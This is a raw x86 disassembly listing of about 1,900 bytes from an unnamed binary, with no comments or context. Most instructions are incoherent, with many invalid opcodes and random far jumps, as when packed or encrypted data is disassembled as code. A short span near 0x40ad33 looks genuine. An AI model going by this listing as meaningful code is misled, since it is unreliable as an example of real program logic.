  40ab28:	pop    esp
  40ab29:	test   eax,0x2810fd22
  40ab2e:	mov    es,WORD PTR [edx]
  40ab30:	xlat   BYTE PTR ds:[ebx]
  40ab31:	adc    eax,0x155ac4f7
  40ab36:	pop    edi
  40ab37:	add    DWORD PTR [edx],0xffffff90
  40ab3a:	mov    dl,0xb3
  40ab3c:	sub    dl,BYTE PTR [eax-0x4be6c119]
  40ab42:	mov    esp,0xbdf35fc9
  40ab47:	xor    dl,0x3c
  40ab4a:	fistp  WORD PTR [esi]
  40ab4c:	adc    esi,DWORD PTR [edi+0x194bc53c]
  40ab52:	gs (bad) 
  40ab55:	xchg   ecx,eax
  40ab56:	jno    0x40ab2a
  40ab58:	std    
  40ab59:	icebp  
  40ab5a:	(bad)  
  40ab5c:	jae    0x40abd8
  40ab5e:	sbb    eax,DWORD PTR [ebp+0x6ec50f36]
  40ab64:	repz pushf 
  40ab66:	ss jmp 0x5bfd:0xcafcddb2
  40ab6e:	sti    
  40ab6f:	xor    ebx,ecx
  40ab71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab72:	pop    esi
  40ab73:	and    eax,0x68d300b5
  40ab78:	xchg   ebx,eax
  40ab79:	fst    QWORD PTR gs:[esp+ecx*1+0x20]
  40ab7e:	out    dx,al
  40ab7f:	xor    eax,DWORD PTR [ebx+0x79e167c5]
  40ab85:	(bad)  
  40ab86:	jle    0x40abd5
  40ab88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab89:	cmp    al,0x50
  40ab8b:	xor    cl,0x5d
  40ab8e:	push   esi
  40ab8f:	or     eax,0xa7d34e75
  40ab94:	mov    ebx,DWORD PTR [edi-0x18f3777d]
  40ab9a:	mov    bh,0x6f
  40ab9c:	inc    edx
  40ab9d:	sub    DWORD PTR [eax+edx*2],0x493fb360
  40aba4:	jns    0x40ab53
  40aba6:	imul   ebx,DWORD PTR [ebp+eax*2-0xb9ae7f4],0xffffffdd
  40abae:	popa   
  40abaf:	mov    edx,0xc7ad4d58
  40abb4:	xchg   ebp,eax
  40abb5:	daa    
  40abb6:	mov    bh,bl
  40abb8:	mov    edi,edi
  40abba:	je     0x40ab6c
  40abbc:	imul   BYTE PTR [ebp+0x5a]
  40abbf:	inc    ebx
  40abc0:	addr16 hlt 
  40abc2:	cmp    ebx,ebp
  40abc4:	jnp    0x40ac0b
  40abc6:	idiv   BYTE PTR [eax]
  40abc8:	test   DWORD PTR [ecx+0x27],ecx
  40abcb:	pop    ecx
  40abcc:	inc    esi
  40abcd:	sbb    BYTE PTR [edi-0x53957efd],dl
  40abd3:	rol    al,cl
  40abd5:	push   es
  40abd6:	mov    ebp,0xd30d6c3c
  40abdb:	cwde   
  40abdc:	inc    edx
  40abdd:	pop    esi
  40abde:	add    edi,DWORD PTR [esp+eiz*8-0x2f22e9dc]
  40abe5:	mov    eax,ds:0x8f696ab6
  40abea:	inc    edi
  40abeb:	or     edx,esp
  40abed:	inc    edx
  40abee:	stos   DWORD PTR es:[edi],eax
  40abef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abf0:	mov    ds:0xc4dc84b4,al
  40abf5:	addr16 push edi
  40abf7:	ins    DWORD PTR es:[edi],dx
  40abf8:	sbb    DWORD PTR [edx-0x5],esi
  40abfb:	xchg   DWORD PTR [ebx+0x64],edx
  40abfe:	mov    ds:0x50686314,al
  40ac03:	call   0xea9b:0xcdabfc99
  40ac0a:	call   FWORD PTR [eax-0x37]
  40ac0d:	fld    QWORD PTR [edx]
  40ac0f:	xor    DWORD PTR [edi-0x36],esi
  40ac12:	xor    al,0x69
  40ac14:	inc    esp
  40ac15:	inc    ebp
  40ac16:	or     eax,0xda641f85
  40ac1b:	sub    al,0x93
  40ac1d:	ins    BYTE PTR es:[edi],dx
  40ac1e:	lds    ebp,FWORD PTR [edi]
  40ac20:	cmp    al,0x5e
  40ac22:	data16 jge 0x40ac60
  40ac25:	test   BYTE PTR [edx+0x19b7b056],bl
  40ac2b:	aas    
  40ac2c:	push   eax
  40ac2d:	mov    bh,0x1d
  40ac2f:	or     DWORD PTR [ecx-0x6f859451],esp
  40ac35:	dec    ebp
  40ac36:	inc    edx
  40ac37:	je     0x40ac72
  40ac39:	fwait
  40ac3a:	sub    eax,0x1ae3f897
  40ac3f:	out    0xf7,eax
  40ac41:	loopne 0x40acaa
  40ac43:	int    0x28
  40ac45:	data16 and bh,BYTE PTR [eax+0x60]
  40ac49:	sbb    esi,eax
  40ac4b:	inc    edi
  40ac4c:	mov    ebp,DWORD PTR [ecx-0x4c4a1dd1]
  40ac52:	and    edx,DWORD PTR [edx]
  40ac54:	je     0x40ac58
  40ac56:	or     BYTE PTR [edi],dh
  40ac58:	clc    
  40ac59:	xchg   ebp,eax
  40ac5a:	dec    ebx
  40ac5b:	shr    DWORD PTR [edi-0x4cf9bc3f],0x9e
  40ac62:	mov    WORD PTR [edx],ds
  40ac64:	leave  
  40ac65:	test   bh,dh
  40ac67:	push   es
  40ac68:	xchg   ebx,eax
  40ac69:	hlt    
  40ac6a:	fmul   QWORD PTR fs:[eax]
  40ac6d:	adc    dh,0x34
  40ac70:	pop    edx
  40ac71:	adc    al,BYTE PTR [ebp-0x1f]
  40ac74:	repnz sub esi,DWORD PTR [ebp-0x23f517ec]
  40ac7b:	sub    BYTE PTR [ecx],ah
  40ac7d:	jmp    0x40ac7b
  40ac7f:	sar    DWORD PTR [edx+edx*4+0x71],0x1b
  40ac84:	fmul   st(7),st
  40ac86:	sahf   
  40ac87:	jmp    0x54eaa9e5
  40ac8c:	xchg   ebx,eax
  40ac8d:	sbb    dh,BYTE PTR [edx-0x51]
  40ac90:	and    BYTE PTR [ebx+0x2d8b50a8],ch
  40ac96:	add    eax,0xe4e47727
  40ac9b:	call   0x4e7aac61
  40aca0:	xor    dh,BYTE PTR [esi]
  40aca2:	pop    ecx
  40aca3:	clc    
  40aca4:	inc    esp
  40aca5:	retf   0x2769
  40aca8:	inc    eax
  40aca9:	mov    DWORD PTR ds:0xb2cc461a,eax
  40acaf:	stos   BYTE PTR es:[edi],al
  40acb0:	dec    esi
  40acb1:	xlat   BYTE PTR cs:[ebx]
  40acb3:	cmp    edi,DWORD PTR [esp+ebp*4]
  40acb6:	xor    eax,0x5c662fd8
  40acbb:	push   es
  40acbc:	pop    es
  40acbd:	pop    edx
  40acbe:	or     al,0xd0
  40acc0:	push   ecx
  40acc1:	add    ebp,DWORD PTR [ebx]
  40acc3:	xchg   edx,eax
  40acc4:	test   al,0x55
  40acc6:	cmp    bh,BYTE PTR [ecx-0xd6a83c]
  40accc:	xchg   ebx,eax
  40accd:	push   0x71eda2e1
  40acd2:	in     eax,dx
  40acd3:	scas   eax,DWORD PTR es:[edi]
  40acd4:	xchg   DWORD PTR [edi+0x78e95830],edx
  40acda:	das    
  40acdb:	das    
  40acdc:	push   cs
  40acdd:	jne    0x40ac84
  40acdf:	mov    esi,0x9d25e63e
  40ace4:	cs scas al,BYTE PTR es:[edi]
  40ace6:	stos   BYTE PTR es:[edi],al
  40ace7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ace8:	shl    DWORD PTR [ebx],1
  40acea:	xchg   DWORD PTR [ecx],esi
  40acec:	ret    
  40aced:	test   BYTE PTR [esi+0xd],al
  40acf0:	shl    eax,1
  40acf2:	dec    edx
  40acf3:	ds retf 
  40acf5:	adc    edi,DWORD PTR [edi-0x19655e56]
  40acfb:	inc    esi
  40acfc:	sbb    ah,bh
  40acfe:	das    
  40acff:	xor    bl,0xa5
  40ad02:	cmp    esp,edi
  40ad04:	adc    BYTE PTR [edi],cl
  40ad06:	cmp    ebp,DWORD PTR [esi+0x22]
  40ad09:	mov    esp,DWORD PTR [esi]
  40ad0b:	inc    eax
  40ad0c:	add    eax,0x7c292720
  40ad11:	jb     0x40ad04
  40ad13:	mov    ah,dl
  40ad15:	(bad)  
  40ad16:	sub    eax,DWORD PTR [eax+0xd81b157]
  40ad1c:	and    ebp,DWORD PTR [esi+esi*8]
  40ad1f:	add    dl,BYTE PTR [esi]
  40ad21:	xlat   BYTE PTR ds:[ebx]
  40ad22:	aas    
  40ad23:	xchg   edx,eax
  40ad24:	mul    DWORD PTR [esi-0x5c9e0360]
  40ad2a:	mov    ah,0x94
  40ad2c:	imul   ebp,DWORD PTR [ecx+edx*1+0x0],0xffffffe6
  40ad31:	add    BYTE PTR [eax],cl
  40ad33:	mov    eax,DWORD PTR [ebp-0x60]
  40ad36:	mov    ecx,DWORD PTR [ebp-0x5c]
  40ad39:	shrd   eax,ecx,0x2
  40ad3d:	shr    ecx,0x2
  40ad40:	mov    ecx,DWORD PTR [ebp-0x60]
  40ad43:	mov    edx,DWORD PTR [ebp-0x5c]
  40ad46:	jmp    0x40b2d0
  40ad4b:	dec    ebx
  40ad4c:	adc    BYTE PTR [edi+0x4d],bl
  40ad4f:	adc    eax,0x89101919
  40ad54:	xchg   ebx,eax
  40ad55:	inc    esi
  40ad56:	mov    ah,0x1e
  40ad58:	jb     0x40ad04
  40ad5a:	scas   al,BYTE PTR es:[edi]
  40ad5b:	lea    ecx,[ecx]
  40ad5d:	push   ss
  40ad5e:	push   ss
  40ad5f:	cmp    eax,0x39161604
  40ad64:	les    esi,FWORD PTR [ebp-0x585cabd3]
  40ad6a:	mov    ecx,DWORD PTR ds:0x8ecac103
  40ad70:	ds dec ebp
  40ad72:	sub    eax,ebx
  40ad74:	hlt    
  40ad75:	pop    ebx
  40ad76:	jbe    0x40add9
  40ad78:	push   ebx
  40ad79:	mov    ecx,0xc2038c78
  40ad7e:	fadd   DWORD PTR [ebp+0x31996668]
  40ad84:	inc    esp
  40ad85:	sub    ch,BYTE PTR [esi-0xe27c96f]
  40ad8b:	mov    esi,0x1143c5a9
  40ad90:	and    eax,0x86f29b5e
  40ad95:	xchg   edi,eax
  40ad96:	add    DWORD PTR ds:0x82b28f23,eax
  40ad9c:	(bad)  [ebx-0x28ecc21f]
  40ada2:	jmp    0xdf96:0x4394c0ec
  40ada9:	(bad)  
  40adaa:	xchg   esp,eax
  40adab:	cwde   
  40adac:	and    bh,ah
  40adae:	popa   
  40adaf:	mov    eax,tr4
  40adb2:	inc    eax
  40adb3:	mov    al,ds:0x37e95891
  40adb8:	call   0x55520c47
  40adbd:	pop    ds
  40adbe:	jmp    0x72bb07e1
  40adc3:	es jae 0x40ad94
  40adc6:	in     al,dx
  40adc7:	out    dx,eax
  40adc8:	leave  
  40adc9:	shl    DWORD PTR [esi+eax*1],cl
  40adcc:	jge    0x40adb1
  40adce:	mov    bl,0xed
  40add0:	shl    BYTE PTR [esi-0x6c26c71e],cl
  40add6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40add7:	cwde   
  40add8:	push   cs
  40add9:	or     dl,BYTE PTR [eax-0x7e]
  40addc:	push   ecx
  40addd:	(bad)  
  40adde:	mov    ebp,0x52b00d9e
  40ade3:	jmp    FWORD PTR ds:0x23a74220
  40ade9:	call   0x59be96e
  40adee:	aam    0xce
  40adf0:	xchg   esp,eax
  40adf1:	dec    ebp
  40adf2:	mov    ecx,0x40bb3435
  40adf7:	push   es
  40adf8:	dec    ebp
  40adf9:	loopne 0x40adb1
  40adfb:	push   ebx
  40adfc:	imul   eax,DWORD PTR [ebx+eiz*8],0xf2a4d01e
  40ae03:	mov    ch,0xfb
  40ae05:	jnp    0x40ae00
  40ae07:	push   ds
  40ae08:	adc    ch,BYTE PTR [eax]
  40ae0a:	push   edx
  40ae0b:	cmp    eax,0xb196d1ce
  40ae10:	pop    es
  40ae11:	jno    0x40ad97
  40ae13:	sbb    eax,0x4ed075b0
  40ae18:	sub    DWORD PTR [ebx-0x569e321e],esi
  40ae1e:	mov    ebp,0x928c1f9c
  40ae23:	or     BYTE PTR [eax],ah
  40ae25:	add    bh,BYTE PTR [esi+ebx*2]
  40ae28:	lahf   
  40ae29:	rcl    ah,1
  40ae2b:	xchg   esi,eax
  40ae2c:	in     al,dx
  40ae2d:	loop   0x40adb4
  40ae2f:	xchg   esi,eax
  40ae30:	and    ecx,DWORD PTR [esp+esi*4]
  40ae33:	fdiv   QWORD PTR [eax]
  40ae35:	mov    edx,0x146293d5
  40ae3a:	jb     0x40adfc
  40ae3c:	mov    ebx,0x4be47352
  40ae41:	inc    ebx
  40ae42:	add    DWORD PTR [edi],0x38
  40ae45:	fcmovnu st,st(5)
  40ae47:	cwde   
  40ae48:	inc    ebx
  40ae49:	add    al,0xce
  40ae4b:	je     0x40aded
  40ae4d:	int3   
  40ae4e:	shl    edi,0xa
  40ae51:	daa    
  40ae52:	cmp    ch,BYTE PTR [edi+edx*2+0x48]
  40ae56:	hlt    
  40ae57:	push   es
  40ae58:	adc    al,0xee
  40ae5a:	lods   al,BYTE PTR ds:[esi]
  40ae5b:	mov    bh,0x2b
  40ae5d:	cmp    eax,0x623b4447
  40ae62:	in     eax,0xca
  40ae64:	iret   
  40ae65:	sbb    esi,DWORD PTR [edx+0x4a]
  40ae68:	push   ss
  40ae69:	pop    edx
  40ae6a:	lock sub DWORD PTR [edi-0x675e7102],ebp
  40ae71:	pop    edx
  40ae72:	call   0x3141:0xf613e0e7
  40ae79:	xor    ah,bl
  40ae7b:	xchg   ebx,eax
  40ae7c:	push   ecx
  40ae7d:	lds    ecx,FWORD PTR [edx+0x7e]
  40ae80:	out    0xa3,eax
  40ae82:	add    esi,DWORD PTR [ebp+0x5ae2520f]
  40ae88:	or     eax,0xf00368ae
  40ae8d:	fimul  DWORD PTR [esp+ebx*4+0x2060fb5c]
  40ae94:	retf   0xce18
  40ae97:	std    
  40ae98:	outs   dx,BYTE PTR ds:[esi]
  40ae99:	push   eax
  40ae9a:	cmp    ch,BYTE PTR [ecx+0x52]
  40ae9d:	adc    eax,0x8f101bbe
  40aea2:	clc    
  40aea3:	mov    ah,0x8b
  40aea5:	sbb    DWORD PTR [esi+0x71],edi
  40aea8:	fucomi st,st(3)
  40aeaa:	jmp    0xd4d:0x3aba8264
  40aeb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aeb2:	in     al,dx
  40aeb3:	inc    esi
  40aeb4:	inc    edx
  40aeb5:	xchg   esi,eax
  40aeb6:	push   0xffffff8f
  40aeb8:	mul    bl
  40aeba:	sub    DWORD PTR [edi+0x27],0xffffffcc
  40aebe:	std    
  40aebf:	dec    esi
  40aec0:	mov    esi,DWORD PTR [esi-0x38]
  40aec3:	sub    al,BYTE PTR [ebx]
  40aec5:	mov    bh,0xa4
  40aec7:	push   cs
  40aec8:	push   ecx
  40aec9:	mov    eax,ds:0xafeee355
  40aece:	ins    DWORD PTR es:[edi],dx
  40aecf:	call   0x55be:0x7fdc38ce
  40aed6:	add    al,0xf3
  40aed8:	js     0x40aecf
  40aeda:	mov    ah,0x86
  40aedc:	push   esp
  40aedd:	out    dx,eax
  40aede:	rcr    ebx,cl
  40aee0:	icebp  
  40aee1:	or     edi,DWORD PTR [esi+eax*8]
  40aee4:	adc    al,0xa7
  40aee6:	jae    0x40af01
  40aee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aee9:	les    eax,FWORD PTR [eax-0x7b]
  40aeec:	addr16 adc ebx,eax
  40aeef:	jge    0x40af4c
  40aef1:	mov    cl,0x20
  40aef3:	mov    dh,0xf2
  40aef5:	mov    BYTE PTR [ebx+edi*4-0x9397eaa],ch
  40aefc:	add    dl,BYTE PTR [ebx]
  40aefe:	inc    edx
  40aeff:	into   
  40af00:	(bad)  
  40af01:	lock xor al,0x1
  40af04:	push   es
  40af05:	xor    DWORD PTR [ebx+eax*1-0x198c7a5],ebx
  40af0c:	lods   eax,DWORD PTR ds:[esi]
  40af0d:	pusha  
  40af0e:	or     DWORD PTR [esi-0x73],ebx
  40af11:	fmul   st(5),st
  40af13:	and    al,0xb2
  40af15:	xchg   ebp,eax
  40af16:	hlt    
  40af17:	mov    ebp,0xfb0f8ea1
  40af1c:	in     eax,0x37
  40af1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af1f:	jae    0x40af36
  40af21:	mov    esp,0xa4a69f1f
  40af26:	cmp    DWORD PTR [edx],eax
  40af28:	dec    ebp
  40af29:	test   BYTE PTR [ecx-0x7f851a26],0x6
  40af30:	mov    DWORD PTR [esi+0x600c2053],0x6a59269a
  40af3a:	and    al,0x98
  40af3c:	add    al,0x0
  40af3e:	push   es
  40af3f:	test   DWORD PTR [eax],eax
  40af41:	jecxz  0x40af21
  40af43:	mov    eax,db6
  40af46:	xor    DWORD PTR ds:[ebx-0x47],ecx
  40af4a:	mov    esi,DWORD PTR [edi]
  40af4c:	inc    ecx
  40af4d:	xchg   ebp,ecx
  40af4f:	or     eax,0x91d49bf5
  40af54:	or     dh,BYTE PTR [ecx-0x1954fde8]
  40af5a:	ds stos DWORD PTR es:[edi],eax
  40af5c:	jg     0x40afb6
  40af5e:	stos   DWORD PTR es:[edi],eax
  40af5f:	out    0x83,al
  40af61:	fldcw  WORD PTR ss:[edi-0x3]
  40af65:	sbb    ecx,DWORD PTR [esi-0x38]
  40af68:	enter  0x2b81,0xdb
  40af6c:	and    ah,BYTE PTR [esi]
  40af6e:	xchg   BYTE PTR [bp+si-0x1d21],ch
  40af73:	es addr16 inc ecx
  40af76:	sar    ebp,cl
  40af78:	rcl    BYTE PTR [esi+ecx*8],cl
  40af7b:	sbb    DWORD PTR [esp+eiz*2+0x69],ebp
  40af7f:	ss sub al,0x36
  40af82:	dec    edx
  40af83:	push   ebx
  40af84:	pop    eax
  40af85:	int    0x48
  40af87:	mov    WORD PTR cs:[edi+0x3d8f36c2],es
  40af8e:	dec    edi
  40af8f:	call   0x5fcd:0x4dc54f53
  40af96:	loopne 0x40b016
  40af98:	add    al,0x7
  40af9a:	jns    0x40af38
  40af9c:	pop    edx
  40af9d:	mov    DWORD PTR [edi+0x2f],esi
  40afa0:	ds sub eax,0x67fa1c18
  40afa6:	add    BYTE PTR [esi+0x4d],bl
  40afa9:	mov    ss,WORD PTR [ecx-0x51]
  40afac:	pop    ds
  40afad:	or     ebp,DWORD PTR [ebx-0x39]
  40afb0:	or     DWORD PTR [eax+0x470a49a3],eax
  40afb6:	scas   eax,DWORD PTR es:[edi]
  40afb7:	jno    0x40afe7
  40afb9:	mov    esp,0x23e1f058
  40afbe:	jecxz  0x40b023
  40afc0:	sar    BYTE PTR [ecx],1
  40afc2:	jge    0x40afd5
  40afc4:	rcr    BYTE PTR [edx],cl
  40afc6:	pusha  
  40afc7:	ins    BYTE PTR es:[edi],dx
  40afc8:	jecxz  0x40af68
  40afca:	pop    ebp
  40afcb:	pop    es
  40afcc:	ret    
  40afcd:	sbb    eax,DWORD PTR [edx-0x53d434a6]
  40afd3:	push   ds
  40afd4:	imul   ecx,edi,0x7906b06e
  40afda:	xor    eax,0x39a8f182
  40afdf:	hlt    
  40afe0:	and    DWORD PTR [ebx-0x7e],edx
  40afe3:	sbb    ecx,DWORD PTR [ebp-0x2050e0d5]
  40afe9:	icebp  
  40afea:	push   eax
  40afeb:	dec    esp
  40afec:	mov    eax,ds:0x63ae444
  40aff1:	enter  0x5f6f,0x76
  40aff5:	mov    ah,0xa9
  40aff7:	ret    
  40aff8:	cmp    BYTE PTR [ebx+0x2f3f1902],cl
  40affe:	xor    DWORD PTR [esi+0x7cca76d5],esp
  40b004:	xchg   ebp,eax
  40b005:	add    DWORD PTR [edx+0x55],esi
  40b008:	jb     0x40b066
  40b00a:	xchg   esi,eax
  40b00b:	fwait
  40b00c:	or     DWORD PTR [edi+0x2c86d2b5],0x57
  40b013:	push   ebp
  40b014:	cmc    
  40b015:	sub    DWORD PTR [ebx],esi
  40b017:	test   eax,0xa9eaf7e
  40b01c:	or     esi,eax
  40b01e:	push   ss
  40b01f:	fild   WORD PTR [esi+0x35]
  40b022:	call   0xeee36418
  40b027:	outs   dx,DWORD PTR ds:[esi]
  40b028:	adc    BYTE PTR [edi+0x39],bl
  40b02b:	add    BYTE PTR [eax],dh
  40b02d:	mov    dl,0x4
  40b02f:	push   0x7597f2f6
  40b034:	mov    al,0xfe
  40b036:	frstor [ecx-0x37]
  40b039:	dec    esi
  40b03a:	stos   DWORD PTR es:[edi],eax
  40b03b:	dec    eax
  40b03c:	xor    BYTE PTR [ecx],dl
  40b03e:	out    dx,eax
  40b03f:	fs mov esi,esp
  40b042:	mov    edi,0x1a23aaab
  40b047:	iret   
  40b048:	xor    eax,0x5928af37
  40b04d:	test   DWORD PTR [esi],ecx
  40b04f:	test   al,0x51
  40b051:	and    ebp,DWORD PTR [esi+0x6d3e83e8]
  40b057:	pop    ebx
  40b058:	xchg   ebp,eax
  40b059:	mov    bl,0xf6
  40b05b:	les    esi,FWORD PTR [eax-0x693e7d03]
  40b061:	sub    al,0x14
  40b063:	adc    eax,0x70473f8c
  40b068:	ret    0xa364
  40b06b:	pop    es
  40b06c:	sub    eax,0x8f73bde0
  40b071:	inc    ebp
  40b072:	ret    
  40b073:	push   ecx
  40b074:	rol    dh,1
  40b076:	inc    esi
  40b077:	into   
  40b078:	mov    ah,0x2b
  40b07a:	add    ch,dl
  40b07c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b07d:	in     al,dx
  40b07e:	test   DWORD PTR [esi],ecx
  40b080:	(bad)  
  40b082:	int    0x94
  40b084:	mov    esi,0x861e0868
  40b089:	push   esi
  40b08a:	sti    
  40b08b:	push   cs
  40b08c:	inc    ecx
  40b08d:	push   es
  40b08e:	adc    al,0xf0
  40b090:	push   ecx
  40b091:	add    al,0x71
  40b093:	mov    ?,WORD PTR [edx]
  40b095:	loope  0x40b080
  40b097:	add    edi,ecx
  40b099:	jp     0x40b0f7
  40b09b:	fidiv  DWORD PTR [ebx+0x57]
  40b09e:	jp     0x40b104
  40b0a0:	inc    eax
  40b0a1:	int    0x11
  40b0a3:	pop    esp
  40b0a4:	lods   al,BYTE PTR ds:[esi]
  40b0a5:	addr16 fwait
  40b0a7:	jns    0x40b04f
  40b0a9:	dec    edi
  40b0aa:	in     al,dx
  40b0ab:	nop
  40b0ac:	inc    esi
  40b0ad:	cmp    BYTE PTR [ecx-0x23],cl
  40b0b0:	and    al,0xab
  40b0b2:	and    eax,0xf80e3d0c
  40b0b7:	ret    0x2df
  40b0ba:	jl     0x40b0a8
  40b0bc:	pop    ds
  40b0bd:	inc    edi
  40b0be:	pop    edi
  40b0bf:	sbb    eax,0x36801fe3
  40b0c4:	into   
  40b0c5:	sbb    esp,esi
  40b0c7:	popf   
  40b0c8:	or     bl,BYTE PTR [ebp+eiz*4+0x1d0a34f5]
  40b0cf:	pop    ds
  40b0d0:	push   es
  40b0d1:	fistp  DWORD PTR [esi-0x20]
  40b0d4:	or     DWORD PTR [ebx+0x63a2716d],ecx
  40b0da:	jp     0x40b061
  40b0dc:	(bad)  
  40b0dd:	dec    ebp
  40b0de:	popf   
  40b0df:	add    DWORD PTR [edi+edx*8+0x2d18525a],eax
  40b0e6:	push   esp
  40b0e7:	cld    
  40b0e8:	jae    0x40b083
  40b0ea:	sahf   
  40b0eb:	enter  0x3405,0x93
  40b0ef:	pop    edi
  40b0f0:	mov    dl,0x7a
  40b0f2:	push   esi
  40b0f3:	dec    edi
  40b0f4:	rcr    BYTE PTR [esi+0x52fc5eb6],1
  40b0fa:	in     eax,0x2f
  40b0fc:	mov    ecx,0x502b869e
  40b101:	int    0x7a
  40b103:	addr16 pop ebp
  40b105:	nop    DWORD PTR [esi-0x56b4c04b]
  40b10c:	pop    es
  40b10d:	cmc    
  40b10e:	sbb    DWORD PTR ds:0x7fe2eec,esp
  40b114:	cs stos DWORD PTR es:[edi],eax
  40b116:	mov    ebx,0x7ca4b1ef
  40b11b:	pushf  
  40b11c:	ins    BYTE PTR es:[edi],dx
  40b11d:	repz pop esp
  40b11f:	imul   edx,DWORD PTR [edi],0xe5f1b984
  40b125:	jmp    0x98720210
  40b12a:	fcomp  DWORD PTR [bp+0x6abf]
  40b12f:	dec    eax
  40b130:	pop    ecx
  40b131:	push   esp
  40b132:	jae    0x40b135
  40b134:	(bad)  
  40b135:	fdivp  st(1),st
  40b137:	iret   
  40b138:	in     eax,dx
  40b139:	in     eax,0x9c
  40b13b:	pop    edi
  40b13c:	or     al,0x74
  40b13e:	sub    eax,0xb174e81e
  40b143:	(bad)  
  40b145:	data16 jle 0x40b148
  40b148:	pop    es
  40b149:	aam    0x19
  40b14b:	jp     0x40b167
  40b14d:	ror    BYTE PTR [edi-0x6621c451],1
  40b153:	sahf   
  40b154:	sub    cl,al
  40b156:	mov    bl,0x19
  40b158:	xchg   esp,eax
  40b159:	xchg   DWORD PTR [edx-0x1f],ebp
  40b15c:	add    ch,BYTE PTR [ecx]
  40b15e:	adc    ch,BYTE PTR [edx+ecx*1-0x4f29f20e]
  40b165:	push   ebp
  40b166:	mov    dl,0x81
  40b168:	ds ins BYTE PTR es:[edi],dx
  40b16a:	rol    esi,0x9f
  40b16d:	mov    ah,0xae
  40b16f:	sub    eax,0xaa79620c
  40b174:	cli    
  40b175:	std    
  40b176:	mov    cl,0xf6
  40b178:	dec    edx
  40b179:	pop    edi
  40b17a:	mov    ebx,0x798c9c66
  40b17f:	dec    ecx
  40b180:	in     al,0x73
  40b182:	mov    ch,0xc2
  40b184:	push   0xb56e3da5
  40b189:	cmc    
  40b18a:	cmp    ah,dl
  40b18c:	stc    
  40b18d:	ins    DWORD PTR es:[edi],dx
  40b18e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b18f:	test   BYTE PTR [ebx+0x3c8c73a8],dl
  40b195:	and    ecx,esp
  40b197:	fwait
  40b198:	push   ds
  40b199:	retf   
  40b19a:	test   BYTE PTR [ebp-0x2b],al
  40b19d:	inc    eax
  40b19e:	loop   0x40b21f
  40b1a0:	inc    eax
  40b1a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a2:	cmc    
  40b1a3:	lods   eax,DWORD PTR ds:[esi]
  40b1a4:	js     0x40b20b
  40b1a6:	adc    al,0xf5
  40b1a8:	loopne 0x40b153
  40b1aa:	cmp    esp,ebx
  40b1ac:	dec    edx
  40b1ad:	push   ds
  40b1ae:	push   esi
  40b1af:	pop    ss
  40b1b0:	cmp    BYTE PTR ds:0xd9bc9c7f,al
  40b1b6:	repz in al,0xa0
  40b1b9:	or     eax,0xd8e7fd6d
  40b1be:	dec    ebp
  40b1bf:	push   eax
  40b1c0:	bnd jmp 0x40b1e1
  40b1c3:	mov    ss,WORD PTR [ebp+0xd]
  40b1c6:	xor    ebp,DWORD PTR [ebp+0xb35f2ff]
  40b1cc:	(bad)  
  40b1cd:	mov    ds:0x7a6c781f,eax
  40b1d2:	loope  0x40b204
  40b1d4:	jns    0x40b248
  40b1d6:	jns    0x40b231
  40b1d8:	js     0x40b213
  40b1da:	mov    dl,0x4b
  40b1dc:	shl    BYTE PTR [ecx+0xe],0xd9
  40b1e0:	ret    
  40b1e1:	stc    
  40b1e2:	push   cs
  40b1e3:	adc    dh,BYTE PTR [edi-0x204e8cf2]
  40b1e9:	mov    DWORD PTR [ecx-0x380ae059],edx
  40b1ef:	fxch   st(2)
  40b1f1:	sub    dl,cl
  40b1f3:	and    DWORD PTR [eax+edx*2+0x2c517cf2],ebp
  40b1fa:	in     al,0xf8
  40b1fc:	retf   0xa168
  40b1ff:	les    esi,FWORD PTR [ebx+0xd]
  40b202:	sub    cl,BYTE PTR [esi-0x4e]
  40b205:	xor    al,0x4b
  40b207:	leave  
  40b208:	xor    DWORD PTR [eax],ecx
  40b20a:	sahf   
  40b20b:	(bad)  
  40b20c:	dec    ebp
  40b20d:	pusha  
  40b20e:	jmp    0x40b241
  40b210:	ds mov edx,0xe33b00f4
  40b216:	mov    al,ds:0x372532a6
  40b21b:	dec    eax
  40b21c:	popf   
  40b21d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b21e:	and    ah,BYTE PTR [edi+eax*2]
  40b221:	shr    BYTE PTR [esi-0x683b6925],1
  40b227:	adc    DWORD PTR [eax+0x46052d19],eax
  40b22d:	arpl   WORD PTR [edx-0x5eeb8bd2],ax
  40b233:	dec    edi
  40b234:	cmp    bl,BYTE PTR [edx]
  40b236:	nop
  40b237:	cmp    BYTE PTR [edi-0x4c],al
  40b23a:	dec    ecx
  40b23b:	pusha  
  40b23c:	hlt    
  40b23d:	pop    es
  40b23e:	push   ebx
  40b23f:	in     eax,dx
  40b240:	gs je  0x40b1d2
  40b243:	cmp    ebx,DWORD PTR [ecx+edx*8-0x60]
  40b247:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40b249:	(bad)  
  40b24a:	test   al,0x96
  40b24c:	call   0x7925b93f
  40b251:	jo     0x40b22b
  40b253:	pop    edi
  40b254:	push   0x19acf9a3
  40b259:	loope  0x40b27e
  40b25b:	inc    esp
  40b25c:	retf   0xe3ed
  40b25f:	or     edx,ebx
  40b261:	mov    ds:0x11652b11,al
  40b266:	jmp    0x40b1f6
  40b268:	add    eax,DWORD PTR [edi+0x7b]
  40b26b:	(bad)  
  40b26d:	add    eax,0x6b3025a3
  40b272:	dec    edx
  40b273:	call   0x159c:0x77387cfb
  40b27a:	xchg   esp,eax
  40b27b:	mov    ch,0xca
  40b27d:	(bad)  
  40b27e:	retf   0xe044
  40b281:	ret    0x3c45
  40b284:	pop    ecx
  40b285:	and    ch,BYTE PTR [edx-0x49]
  40b288:	in     al,dx
  40b289:	inc    esi
  40b28a:	xchg   ecx,eax
  40b28b:	mov    bh,0x5a
  40b28d:	aam    0x46
  40b28f:	sbb    cl,BYTE PTR [edi+0x63]
  40b292:	pop    ecx
  40b293:	xchg   DWORD PTR [ecx],ebp
  40b295:	push   ebp
